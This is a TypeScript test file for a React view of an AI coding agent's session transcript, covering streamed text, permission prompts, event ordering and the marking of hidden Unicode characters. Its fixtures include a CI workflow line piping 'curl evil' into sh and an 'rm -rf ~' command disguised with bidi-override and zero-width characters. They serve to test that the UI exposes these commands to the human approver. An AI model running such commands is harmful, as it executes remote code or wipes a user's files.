// The transcript against the replay server's streams (issue #14, Test
// seams): streamed text grows in place and settles, a permission request is
// shown open until its decision, and only projected events change anything.

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Revealed, Transcript as TranscriptView } from "../components/Transcript";
import type { Envelope, Event } from "../protocol/agent-events.gen";
import type { SessionView } from "./follow";
import { events } from "./replays";
import { type Transcript, apply, emptyTranscript, isOpen } from "./transcript";

const play = (list: Envelope[], from: Transcript = emptyTranscript) => list.reduce(apply, from);

/** Every transcript along the way, one per event. */
const steps = (list: Envelope[]) => {
  const out: Transcript[] = [];
  list.reduce((t, e) => {
    const next = apply(t, e);
    out.push(next);
    return next;
  }, emptyTranscript);
  return out;
};

const envelope = (seq: number, event: Event): Envelope => ({
  v: 1,
  session_id: "s1",
  seq,
  ts: "2026-01-01T00:00:00Z",
  source: { backend: "claude-code", backend_version: "2.1.302", raw_from: seq, raw_to: seq },
  event,
});

const render = (transcript: Transcript, answers: SessionView["answers"] = {}) =>
  renderToStaticMarkup(
    createElement(TranscriptView, {
      title: "replay",
      view: { id: "s-replay", transcript, stream: { state: "live" }, answers },
      onDecide: () => {},
    }),
  );

describe("streamed text (replay 02-partial-messages)", () => {
  const replay = events("02-partial-messages");

  it("shows one block that settles on the final text, and nothing for the passthrough lines", () => {
    const all = steps(replay);
    const texts = all.map((t) => t.items.filter((i) => i.kind === "assistant"));
    // Before the first text event there is nothing; after it, always one block.
    const first = texts.findIndex((blocks) => blocks.length > 0);
    expect(first).toBeGreaterThan(0);
    for (const blocks of texts.slice(first)) expect(blocks).toHaveLength(1);
    expect(texts[first]?.[0]).toMatchObject({ text: "ready", final: false });
    expect(all.at(-1)?.items).toEqual([{ kind: "assistant", key: expect.any(String), text: "ready", final: true }]);
    expect(all.at(-1)?.state).toBe("idle");
    expect(render(all.at(-1) as Transcript)).toContain("ready");
  });

  it("grows a block in place, ahead of what follows it", () => {
    const text = (seq: number, block: string, value: string, final = false): Envelope =>
      envelope(seq, { type: "assistant.text", block_id: block, text: value, final });
    const growing = steps([text(0, "a", "Hel"), text(1, "b", "Other"), text(2, "a", "Hello"), text(3, "a", "Hello world", true)]);
    expect(growing.map((t) => t.items.map((i) => (i.kind === "assistant" ? i.text : i.kind)))).toEqual([
      ["Hel"],
      ["Hel", "Other"],
      ["Hello", "Other"],
      ["Hello world", "Other"],
    ]);
  });
});

describe("a permission request (replay 11-stream-permission-prompt-tool-stdio)", () => {
  const replay = events("11-stream-permission-prompt-tool-stdio");
  const requested = replay.findIndex((e) => e.event.type === "permission.requested");
  const beforeAnswer = play(replay.slice(0, requested + 1));

  it("is open, with the tool and its command, until the decision arrives", () => {
    const permission = beforeAnswer.items.find((i) => i.kind === "permission");
    expect(permission?.kind === "permission" && isOpen(permission)).toBe(true);
    const html = render(beforeAnswer);
    expect(html).toContain("Allow Bash?");
    expect(html).toContain("echo probe &gt; probe.txt");
    expect(html).toMatch(/<button[^>]*>Allow<\/button>/);
    expect(html).toMatch(/<button[^>]*>Deny<\/button>/);
  });

  it("shows the answer once it arrives, with the tool's result and the agent's reply", () => {
    const done = play(replay);
    const kinds = done.items.map((i) => i.kind);
    expect(kinds).toEqual(["user", "assistant", "tool", "permission", "assistant"]);
    const permission = done.items.find((i) => i.kind === "permission");
    expect(permission?.kind === "permission" && permission.decision?.behavior).toBe("allow");
    const tool = done.items.find((i) => i.kind === "tool");
    expect(tool?.kind === "tool" && tool.result).toEqual({ content: "(Bash completed with no output)", isError: false });
    const html = render(done);
    expect(html).not.toMatch(/<button[^>]*>Allow<\/button>/);
    expect(html).toContain("Allowed");
  });

  it("shows an answer on its way, and why one was refused", () => {
    const id = replay[requested]?.event.type === "permission.requested" ? replay[requested].event.request_id : "";
    expect(render(beforeAnswer, { [id]: { state: "sending" } })).toContain("Sending…");
    const refused = render(beforeAnswer, {
      [id]: { state: "failed", message: "session.decide_permission: the session is a replay of a recording and cannot change" },
    });
    expect(refused).toContain("cannot change");
    expect(refused).toMatch(/<button[^>]*>Allow<\/button>/);
  });
});

describe("applying events", () => {
  const replay = events("11-stream-permission-prompt-tool-stdio");

  it("ignores events already applied, so a resumed subscription may overlap", () => {
    const once = play(replay);
    expect(play(replay, once)).toBe(once);
    const half = play(replay.slice(0, 10));
    expect(play(replay.slice(5), half)).toEqual(once);
  });

  it("refuses a schema version it does not know, and applies nothing after it", () => {
    const unknown = { ...envelope(0, { type: "user.message", text: "hi", origin: "human" }), v: 2 } as unknown as Envelope;
    const refused = play([unknown, envelope(1, { type: "user.message", text: "later", origin: "human" })]);
    expect(refused.items).toEqual([]);
    expect(refused.refused).toMatch(/older than Core and needs updating/);
    expect(refused.refused).toMatch(/version 2/);
  });
});

describe("event order and endings", () => {
  const replay = events("11-stream-permission-prompt-tool-stdio");
  const requested = replay.findIndex((e) => e.event.type === "permission.requested");

  it("ignores an event beyond the next, which the subscription delivers again in order", () => {
    // A stray live event from an earlier subscription, ahead of the backlog.
    const stray = replay[12] as Envelope;
    const withStray = play([stray, ...replay]);
    expect(withStray).toEqual(play(replay));
  });

  it("closes a request nobody answered once the session ends", () => {
    const ended = play([
      ...replay.slice(0, requested + 1),
      { ...envelope(requested + 1, { type: "session.ended", reason: "backend_exited" }), session_id: "s-replay" },
    ]);
    const permission = ended.items.find((i) => i.kind === "permission");
    expect(permission?.kind === "permission" && isOpen(permission)).toBe(false);
    const html = render(ended);
    expect(html).toContain("Not answered");
    expect(html).not.toMatch(/<button[^>]*>Allow<\/button>/);
  });

  it("says when a turn ends other than by finishing, and nothing when it finishes", () => {
    const done = (seq: number, outcome: "success" | "interrupted") =>
      envelope(seq, { type: "turn.completed", turn: 1, outcome, duration_ms: 1, is_error: outcome !== "success" });
    expect(play([done(0, "success")]).items).toEqual([]);
    expect(play([done(0, "interrupted")]).items).toEqual([{ kind: "notice", key: "turn:0", message: "The turn was interrupted." }]);
  });

  it("shows a tool's text blocks as text, and an event type it does not know as a notice", () => {
    const shown = play([
      envelope(0, { type: "tool.requested", tool_use_id: "t", name: "Read", input: { file_path: "a.txt" } }),
      envelope(1, { type: "tool.result", tool_use_id: "t", content: [{ type: "text", text: "line one" }, { type: "text", text: "line two" }], is_error: false }),
      envelope(2, { type: "something.new" } as unknown as Event),
    ]);
    expect(shown.items[0]).toMatchObject({ result: { content: "line one\nline two" } });
    expect(shown.items[1]).toMatchObject({ kind: "notice" });
    expect(shown.lastSeq).toBe(2);
  });

  it("shows every field of a permission request's input", () => {
    const html = render(
      play([
        envelope(0, {
          type: "permission.requested",
          request_id: "r",
          tool_use_id: "t",
          tool_name: "Write",
          input: { file_path: "C:/repo/.github/workflows/ci.yml", content: "run: curl evil | sh" },
          suggestions: [],
          flags: { default_to_no: false, suppress_always_allow: false, requires_user_interaction: false, classifier_approvable: false },
        }),
      ]),
    );
    expect(html).toContain("ci.yml");
    expect(html).toContain("run: curl evil | sh");
  });
});

describe("what a permission request shows", () => {
  const request = (seq: number, input: Record<string, unknown>, request_id = "r") =>
    envelope(seq, {
      type: "permission.requested",
      request_id,
      tool_use_id: "t",
      tool_name: "Bash",
      input,
      suggestions: [],
      flags: { default_to_no: false, suppress_always_allow: false, requires_user_interaction: false, classifier_approvable: false },
    });

  it("marks characters that would hide or reorder text, as their code points", () => {
    const html = render(play([request(0, { command: "echo safe \u202E; rm -rf ~ #\u200B\u2066" })]));
    expect(html).toContain("U+202E");
    expect(html).toContain("U+200B");
    expect(html).toContain("U+2066");
    expect(html).not.toContain("\u202E");
    expect(html).not.toContain("\u200B");
  });

  it("is the first request with an id: a repeat changes nothing", () => {
    const first = play([request(0, { command: "ls" })]);
    const repeated = play([request(1, { command: "rm -rf ~" })], first);
    expect(repeated.items).toEqual(first.items);
    expect(render(repeated)).not.toContain("rm -rf");
  });

  it("shows a description once, not again as a field", () => {
    const html = render(
      play([
        envelope(0, {
          type: "permission.requested",
          request_id: "r",
          tool_use_id: "t",
          tool_name: "Bash",
          description: "List files",
          input: { command: "ls", description: "List files" },
          suggestions: [],
          flags: { default_to_no: false, suppress_always_allow: false, requires_user_interaction: false, classifier_approvable: false },
        }),
      ]),
    );
    expect(html.split("List files")).toHaveLength(2);
  });
});

describe("marking hidden characters", () => {
  const html = (text: string) => renderToStaticMarkup(createElement(Revealed, { text }));

  it("marks tag characters and a lone carriage return, but not a line ending", () => {
    const tag = String.fromCodePoint(0xe0041);
    expect(html("ok" + tag)).toContain("U+E0041");
    expect(html("a\rb")).toContain("U+000D");
    expect(html("a\r\nb")).not.toContain("U+");
  });

  it("counts a flood of them instead of marking each", () => {
    const flood = "x" + "\u200B".repeat(5000) + "y";
    const out = html(flood);
    expect(out.match(/U\+200B/g)?.length).toBe(64);
    expect(out).toContain("4936 more invisible characters");
    expect(out).toContain("y");
  });
});

describe("a repeated question", () => {
  it("does not reopen one already answered", () => {
    const asked = envelope(0, { type: "question.asked", request_id: "q", questions: [{ id: "a", text: "Which?", multi_select: false }] });
    const answered = envelope(1, { type: "question.answered", request_id: "q", answers: [], answered_by: "user" });
    const again = { ...asked, seq: 2 };
    const shown = play([asked, answered, again]);
    expect(shown.items).toEqual([{ kind: "question", key: "question:q", questions: [{ id: "a", text: "Which?", multi_select: false }], answered: true }]);
  });
});
